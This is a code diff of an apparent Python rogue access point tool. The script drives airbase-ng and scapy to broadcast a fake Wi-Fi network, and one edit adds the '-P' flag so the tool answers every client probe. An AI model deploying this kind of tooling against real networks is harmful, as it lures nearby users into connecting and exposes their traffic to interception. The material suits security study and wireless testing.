@@ -29,12 +29,12 @@ T  = '\033[93m' # tan
 
 lock = Lock()
 DN = open(os.devnull, 'w')
-APs = {}
-chan = 0 # for channel hopping Process
-count = 0 # for channel hopping Process
+APs = {} # for listing APs
+chan = 0 # for channel hopping Thread
+count = 0 # for channel hopping Thread
 forw = '0\n' # for resetting ip forwarding to original state
 ap_mac = '' # for sniff's cb function
-err = None
+err = None # check if channel hopping is working
 
 def parse_args():
     #Create the arguments
@@ -149,6 +149,7 @@ def rm_mon():
             Popen(['ifconfig', m, 'up'], stdout=DN, stderr=DN)
 
 def internet_info(interfaces):
+    '''return the internet connected iface'''
     inet_iface = None
     proc = Popen(['/sbin/ip', 'route'], stdout=PIPE, stderr=DN)
     def_route = proc.communicate()[0].split('\n')#[0].split()
@@ -160,6 +161,9 @@ def internet_info(interfaces):
     if inet_iface:
         return inet_iface, ipprefix
     else:
+        #cont = False
+        #while not cont:
+        #    cont = raw_input('['+R+'-'+W+'] No active internet connection found. AP will be without internet. Hit [c] to continue: ')
         sys.exit('['+R+'-'+W+'] No active internet connection found. Exiting')
 
 def AP_iface(interfaces, inet_iface):
@@ -188,9 +192,7 @@ def start_monitor(ap_iface, channel):
             return mon_iface
 
 def get_mon_mac(mon_iface):
-    '''
-    http://stackoverflow.com/questions/159137/getting-mac-address
-    '''
+    '''http://stackoverflow.com/questions/159137/getting-mac-address'''
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', mon_iface[:15]))
     mac = ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
@@ -199,9 +201,9 @@ def get_mon_mac(mon_iface):
 def start_ap(mon_iface, channel, essid, args):
     print '['+T+'*'+W+'] Starting the fake access point...'
     if args.wpa:
-        Popen(['airbase-ng', '-Z', '4', '-W', '1', '-c', channel, '-e', essid, '-v', mon_iface, '-F', 'fakeAPlog'], stdout=DN, stderr=DN)
+        Popen(['airbase-ng', '-P', '-Z', '4', '-W', '1', '-c', channel, '-e', essid, '-v', mon_iface, '-F', 'fakeAPlog'], stdout=DN, stderr=DN)
     else:
-        Popen(['airbase-ng', '-c', channel, '-e', essid, '-v', mon_iface], stdout=DN, stderr=DN)
+        Popen(['airbase-ng', '-P', '-c', channel, '-e', essid, '-v', mon_iface], stdout=DN, stderr=DN)
     try:
         time.sleep(6) # Copied from Pwnstar which said it was necessary?
     except KeyboardInterrupt:
@@ -210,8 +212,8 @@ def start_ap(mon_iface, channel, essid, args):
     Popen(['ifconfig', 'at0', 'mtu', '1400'], stdout=DN, stderr=DN)
 
 def sniffing(interface, cb):
-    """This exists for if/when I get deauth working
-    so that it's easy to call sniff() in a thread"""
+    '''This exists for if/when I get deauth working
+    so that it's easy to call sniff() in a thread'''
     sniff(iface=interface, prn=cb, store=0)
 
 def dhcp_conf(ipprefix):
